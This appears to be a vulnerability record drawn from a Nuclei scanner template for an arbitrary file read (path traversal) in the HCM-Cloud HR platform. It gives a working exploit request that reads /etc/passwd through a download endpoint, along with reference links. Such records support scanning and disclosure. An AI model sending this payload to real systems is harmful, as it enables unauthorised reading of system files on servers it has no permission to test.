# Nuclei Template: HCM Cloud - Arbitrary File Read
**Template ID:** hcm-cloud-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`hcm-cloud-lfi.yaml`)

## Vulnerability Information & PoC

## Description
HCM-Cloud professional human resources platform in the cloud download Arbitrary file read vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/api/model_report/file/download?index=/&ext=/etc/passwd
```

## References
- https://mp.weixin.qq.com/s/nvV7_ZGDqSUZJ5FNEWDhKw
- https://github.com/wy876/POC/blob/main/%E6%B5%AA%E6%BD%AE%E4%BA%91/HCM-Cloud%E4%BA%91%E7%AB%AF%E4%B8%93%E4%B8%9A%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E5%B9%B3%E5%8F%B0download%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
